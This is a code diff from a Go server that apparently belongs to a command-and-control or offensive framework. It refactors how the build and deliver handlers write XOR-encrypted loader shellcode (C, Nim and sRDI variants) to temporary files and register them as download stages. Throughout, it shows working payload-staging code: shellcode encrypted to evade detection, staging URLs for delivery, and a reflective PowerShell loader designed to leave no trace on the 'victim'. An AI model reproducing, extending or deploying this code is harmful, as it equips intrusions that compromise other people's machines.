@@ -832,17 +832,25 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		key, _ := xorKey()
 		encBin := xorBytes(compressed, key)
-		encBinPath := binPath + ".enc"
-		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
-			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+		if encErr != nil {
+			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
 			return
 		}
+		if _, encErr = encFile.Write(encBin); encErr != nil {
+			encFile.Close()
+			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		encFile.Close()
+		encBinPath := encFile.Name()
 		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
+		SetStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] loader shellcode: raw=%dKB → compressed=%dKB (%.0f%%)\n",
@@ -878,6 +886,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		exeURL := cfg.StageURL + "/stage/" + exeToken
+		SetStageURL(exeToken, exeURL)
 		result["exe_stage"] = exeURL
 
 		op := operatorFromCert(r)
@@ -918,17 +927,25 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		// shellcode would fault. Encrypt raw shellcode directly.
 		key, _ := xorKey()
 		encBin := xorBytes(rawBin, key)
-		encBinPath := binPath + ".enc"
-		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
-			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+		if encErr != nil {
+			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
 			return
 		}
+		if _, encErr = encFile.Write(encBin); encErr != nil {
+			encFile.Close()
+			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		encFile.Close()
+		encBinPath := encFile.Name()
 		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
+		SetStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] loader-c shellcode: raw=%dKB (no compression)\n",
@@ -970,17 +987,25 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		// shellcode would fault. Encrypt raw shellcode directly.
 		key, _ := xorKey()
 		encBin := xorBytes(rawBin, key)
-		encBinPath := binPath + ".enc"
-		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
-			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+		if encErr != nil {
+			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
 			return
 		}
+		if _, encErr = encFile.Write(encBin); encErr != nil {
+			encFile.Close()
+			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		encFile.Close()
+		encBinPath := encFile.Name()
 		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
+		SetStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] loader-nim shellcode: raw=%dKB (no compression)\n",
@@ -1028,11 +1053,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		encBin := xorBytes(rawBin, key)
-		encBinPath := binPath + ".enc"
-		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
-			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+		if encErr != nil {
+			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
 			return
 		}
+		if _, encErr = encFile.Write(encBin); encErr != nil {
+			encFile.Close()
+			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		encFile.Close()
+		encBinPath := encFile.Name()
 
 		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
 		if err != nil {
@@ -1040,6 +1072,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		binURL := cfg.StageURL + "/stage/" + binToken
+		SetStageURL(binToken, binURL)
 
 		// Prefer pre-compiled runner DLL (no Add-Type temp file on victim).
 		// Falls back to Add-Type PS loader when no C# compiler is available.
@@ -1051,6 +1084,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 				return
 			}
 			runnerURL := cfg.StageURL + "/stage/" + runnerToken
+			SetStageURL(runnerToken, runnerURL)
 			ps = psReflectiveLoader(runnerURL, binURL, key)
 			result["runner_stage"] = runnerURL
 		} else {
@@ -1205,11 +1239,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		key, _ := xorKey()
 		encBin := xorBytes(rawBin, key)
-		encBinPath := binPath + ".enc"
-		if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
-			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+		encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+		if encErr != nil {
+			jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
 			return
 		}
+		if _, encErr = encFile.Write(encBin); encErr != nil {
+			encFile.Close()
+			jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+			return
+		}
+		encFile.Close()
+		encBinPath := encFile.Name()
 		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
 		if err != nil {
 			jsonErr(w, "stage srdi bin: "+err.Error(), http.StatusInternalServerError)
@@ -1220,6 +1261,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			stageBase = cfg.ServerURL
 		}
 		binURL := stageBase + "/stage/" + binToken
+		SetStageURL(binToken, binURL)
 		keyHex := fmt.Sprintf("%02x%02x%02x%02x", key[0], key[1], key[2], key[3])
 		op := operatorFromCert(r)
 		s.printf("[%s] sRDI shellcode: %dKB → staged %s\n", op, len(rawBin)/1024, binURL)
@@ -1981,11 +2023,18 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	encBin := xorBytes(rawBin, key)
-	encBinPath := binPath + ".enc"
-	if err := os.WriteFile(encBinPath, encBin, 0600); err != nil {
-		jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
+	encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
+	if encErr != nil {
+		jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
 		return
 	}
+	if _, encErr = encFile.Write(encBin); encErr != nil {
+		encFile.Close()
+		jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
+		return
+	}
+	encFile.Close()
+	encBinPath := encFile.Name()
 
 	binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
 	if err != nil {
